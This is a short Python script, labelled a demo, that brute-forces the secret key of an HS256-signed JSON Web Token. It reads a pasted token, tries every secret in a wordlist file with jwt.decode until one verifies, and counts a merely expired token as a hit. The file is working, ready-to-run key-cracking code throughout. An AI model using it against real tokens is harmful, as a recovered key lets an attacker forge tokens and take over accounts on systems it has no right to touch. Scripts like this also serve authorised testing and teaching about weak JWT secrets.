import jwt
import time
import os

print("=== JWT HS256 WEAK SECRET BRUTE-FORCE DEMO ===")

# =========================
# INPUT TOKEN
# =========================
TOKEN = input("Paste JWT token here: ").strip()

# =========================
# LOAD WORDLIST FILE
# =========================
WORDLIST_FILE = "wordlist.txt"

if not os.path.exists(WORDLIST_FILE):
    print(f"[!] Wordlist file not found: {WORDLIST_FILE}")
    exit(1)

with open(WORDLIST_FILE, "r", encoding="utf-8") as f:
    COMMON_SECRETS = [line.strip() for line in f if line.strip()]

print(f"[+] Loaded {len(COMMON_SECRETS)} secrets from wordlist")

# =========================
# BRUTE-FORCE
# =========================
start = time.perf_counter()
found = None
attempts = 0

for secret in COMMON_SECRETS:
    attempts += 1
    try:
        jwt.decode(TOKEN, secret, algorithms=["HS256"])
        found = secret
        break
    except jwt.ExpiredSignatureError:
        # Secret đúng nhưng token hết hạn
        found = secret
        break
    except jwt.InvalidTokenError:
        pass

end = time.perf_counter()

# =========================
# RESULT
# =========================
print("\n=== RESULT ===")
print("Found secret :", found)
print("Total attempts:", attempts)
print("Time elapsed :", f"{end - start:.6f} seconds")
